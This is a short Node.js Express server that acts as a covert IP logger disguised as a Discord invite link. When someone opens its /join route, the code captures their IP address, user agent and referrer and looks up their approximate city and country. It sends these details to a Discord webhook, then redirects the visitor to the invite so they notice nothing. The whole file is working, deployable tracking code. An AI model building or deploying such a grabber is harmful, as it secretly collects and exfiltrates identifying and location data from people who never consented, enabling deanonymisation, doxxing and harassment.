require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

// Environment variables (set these in your hosting platform)
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const INVITE_URL = 'https://discord.gg/k86MEegBrw';

app.get('/join', async (req, res) => {
  try {
    // Get real IP (handles proxies)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Get additional data
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referrer = req.headers['referer'] || 'No referrer';
    
    // Get approximate location
    const geo = await getGeoData(ip);
    
    // Build Discord message
    const embed = {
      title: '🚨 New Visitor Logged',
      color: 0xFF0000,
      fields: [
        { name: 'IP Address', value: `\`${ip}\``, inline: true },
        { name: 'Location', value: geo, inline: true },
        { name: 'User Agent', value: `\`\`\`${userAgent}\`\`\`` },
        { name: 'Referrer', value: referrer }
      ],
      timestamp: new Date()
    };

    // Send to Discord
    await axios.post(WEBHOOK_URL, {
      embeds: [embed]
    });

  } catch (error) {
    console.error('Logging failed:', error);
  } finally {
    // Always redirect even if logging fails
    res.redirect(INVITE_URL);
  }
});

async function getGeoData(ip) {
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    const data = response.data;
    return `${data.city}, ${data.region}, ${data.country_name}`;
  } catch {
    return 'Location unknown';
  }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Logger running on port ${PORT}`));
